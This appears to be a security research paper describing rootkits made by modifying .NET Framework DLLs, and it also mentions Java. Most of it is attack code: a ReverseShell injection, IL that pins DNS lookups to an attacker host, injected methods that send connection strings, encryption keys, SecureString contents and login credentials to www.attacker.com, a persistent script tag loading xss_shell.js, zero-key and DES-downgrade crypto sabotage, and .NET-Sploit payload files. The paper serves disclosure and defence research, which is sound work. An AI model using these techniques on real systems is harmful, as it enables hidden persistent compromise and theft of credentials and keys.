### Method Injection in .NET Framework

#### Overview
The `Run` method is executed each time a new application instance is created. By injecting code that calls the `ReverseShell` function, we can achieve a "pre-injection" technique, where our code is inserted at the beginning of the original method.

**Original Code:**
```csharp
public void Run(Form mainForm)
{
    // Original implementation
}
```

**Modified Code (Pre-Injection):**
```csharp
public void Run(Form mainForm)
{
    ReverseShell();
    // Original implementation
}
```

### DNS Record Fixation

All DNS queries in the .NET Framework are handled by the `Dns` class, specifically through the `GetHostAddresses` method, which is located in `System.dll`. To modify this method and fixate the IP address to an attacker's Man-In-The-Middle (MITM) IP, we can pre-inject the following lines of code:

**Injected Code:**
```il
IL_0000: ldstr "www.attacker.com"
IL_0005: starg.s hostNameOrAddress
```

This modification will always return the query result for `www.attacker.com`, ignoring the requested hostname. This technique can be extended to perform any desired DNS manipulation.

### Stealing Connection Strings

The `SqlConnection` class, located in `System.Data.dll`, is responsible for opening database connections. The `Open` method opens a connection as specified in the `connectionString` member variable. We can modify the `Open` method to send the connection string to the attacker each time it is called.

**Modified Open Method:**
```csharp
public override void Open()
{
    SendToUrl("www.attacker.com", this.ConnectionString);
    // Original implementation
}
```

### Injecting Browser Exploitation Frameworks

The .NET Framework contains many pieces of HTML/JavaScript code used by ASPX pages as templates. These are embedded resources within Framework DLLs, such as `System.Web.dll`. By tampering with these resources, we can inject persistent JavaScript code, similar to persistent Cross-Site Scripting (XSS).

**Example Injection:**
```javascript
<script src="http://www.attacker.com/xss_shell.js"></script>
```

This allows the attacker to control the client's browser for every page they visit.

### Encryption Key Manipulation

The `mscorlib.dll` (System.Security.Cryptography) provides various encryption methods. By modifying the code, we can perform several attacks, such as key fixation, key stealing, and algorithm downgrading.

**Key Fixation Example:**
```csharp
public override void GenerateKey()
{
    base.KeyValue = new byte[base.KeySizeValue / 8];
    // Removed: Utils.StaticRandomNumberGenerator.GetBytes(base.KeyValue);
}
```

This will always generate a zero key, giving a false sense of security to the user.

**Key Stealing Example:**
```csharp
public override void GenerateKey()
{
    base.KeyValue = new byte[base.KeySizeValue / 8];
    Utils.StaticRandomNumberGenerator.GetBytes(base.KeyValue);
    SendToUrl("www.attacker.com", Convert.ToBase64String(base.KeyValue));
}
```

**Algorithm Downgrading Example:**
```csharp
public static SymmetricAlgorithm Create()
{
    return new DESCryptoServiceProvider(); // Instead of AES
}
```

### SecureString Stealing

`SecureString` is a special string protected with encryption by the .NET Framework, implemented in `mscorlib.dll`. By injecting code into the `Dispose` method, we can send the decrypted data to the attacker.

**Injected Code:**
```csharp
IntPtr ptr = System.Runtime.InteropServices.Marshal.SecureStringToBSTR(secureString);
SendToUrl("www.attacker.com", System.Runtime.InteropServices.Marshal.PtrToStringBSTR(ptr));
```

### Disabling Security Checks

Modifying the behavior of classes in `System.Security` and `System.Security.Permissions` can disable security checks. For example, changing the logic of `CodeAccessPermission::Demand()`, `CodeAccessPermission::Deny()`, and `CodeAccessPermission::Assert()` can backdoor security checks for specific users or DLLs.

### Automating the Process with .NET-Sploit

.NET-Sploit is a tool developed to automate the process of injecting and modifying .NET assemblies. It supports:

- Modifying functions
- Injecting payloads
- Executing payloads
- Handling code reshaping
- Pulling relevant DLLs from the GAC
- Generating deployers for modified DLLs

**Example #1: Printing Every String Twice**

**Payload File (WriteLine_Twice.payload):**
```il
IL_0000: call class System.IO.TextWriter System.Console::get_Out()
IL_0005: ldarg.0
IL_0006: callvirt instance void System.IO.TextWriter::WriteLine(string)
IL_000b: ret
```

**Item File (WriteLine_Twice.item):**
```xml
<Description>Prints every string twice</Description>
<TargetAssembly>mscorlib.dll</TargetAssembly>
<GacLocation>c:\WINDOWS\assembly\GAC_32\mscorlib\2.0.0.0__b77a5c561934e089</GacLocation>
<NativeImageLocation>c:\WINDOWS\assembly\NativeImages_v2.0.50727_32\mscorlib</NativeImageLocation>
<Payload>
    <File>writeline_twice.payload</File>
    <MethodSignature>.method public hidebysig static void WriteLine(string 'value') cil managed</MethodSignature>
    <StackSize>8</StackSize>
</Payload>
```

**Example #2: Sending Authentication Details to the Attacker**

**Payload File (call_steal_password.payload):**
```il
IL_0000: ldstr "http://www.attacker.com/CookieStealer/WebForm1.aspx?s="
IL_0005: ldarg.0
IL_0006: ldstr ":"
IL_000b: ldarg.1
IL_000c: call string [mscorlib]System.String::Concat(string, string, string)
IL_0011: call void System.Web.Security.FormsAuthentication::SendToUrl(string, string)
IL_0016: ret
```

**Function File (SendToUrl_generic.func):**
```csharp
public static void SendToUrl(string url, string data)
{
    // Implementation
}
```

**Item File (steal_authentication_credentials.item):**
```xml
<Description>Sends authentication details to the attacker</Description>
<TargetAssembly>System.Web.dll</TargetAssembly>
<GacLocation>c:\WINDOWS\assembly\GAC_32\System.Web\2.0.0.0__b03f5f7f11d50a3a</GacLocation>
<NativeImageLocation>c:\WINDOWS\assembly\NativeImages_v2.0.50727_32\System.Web</NativeImageLocation>
<Function>
    <File>SendToUrl_generic.func</File>
    <InjectionLocation>Before</InjectionLocation>
</Function>
<Payload>
    <File>call_steal_password.payload</File>
    <MethodSignature>.method public hidebysig static bool Authenticate(string name, string password)</MethodSignature>
    <StackSize>8</StackSize>
</Payload>
```

### Other Platforms Relevancy â€“ Java Rootkits

While this paper focuses on the .NET Framework, the same techniques can be applied to Java's JVM. By extracting and modifying the bytecode of Java classes in the JRE library directory, we can create similar rootkits. For example, the `com.sun.security.auth.module.Crypt` class, which provides password encryption, can be tampered with using the same techniques.

### Conclusions

Modifying the framework behavior can lead to significant security vulnerabilities. An attacker who has compromised a machine can backdoor the framework, leaving rootkits behind without any traces. While there is little the machine owner can do once the machine is compromised, external file tampering detectors and kernel-level protections can help mitigate these risks.

### About

Erez Metula is a senior application security consultant and trainer, working as the application security department manager at 2BSecure.

### References

1. Common Language Runtime (CLR), Microsoft
   - [Link](http://msdn.microsoft.com/en-us/library/8bs2ecf4(VS.80).aspx)

2. Common Language Infrastructure (CLI), Standard ECMA-335
   - [Link](http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-335.pdf)

3. .NET reverse engineering, Erez Metula
   - [Link](http://download.microsoft.com/download/7/7/b/77b7a327-8b92-4356-bb18-bc01e09abef3/m5p.pdf)

4. FileMon, Mark Russinovich and Bryce Cogswell
   - [Link](http://technet.microsoft.com/en-us/sysinternals/bb896642.aspx)

5. .NET Reflector, Lutz Roeder
   - [Link](http://www.red-gate.com/products/reflector/)

6. NGen Revs Up Your Performance with Powerful New Features, Microsoft
   - [Link](http://msdn.microsoft.com/en-us/magazine/cc163808.aspx)

7. drop-and-pop, ha.cked,net
   - [Link](http://ha.cked.net/dropandpop.zip)

8. .NET-Sploit, Erez Metula
   - [Link](http://www.applicationsecurity.co.il/.NET-Framework-Rootkits.aspx)

9. Metasploit project, H D Moore
   - [Link](www.metasploit.com/)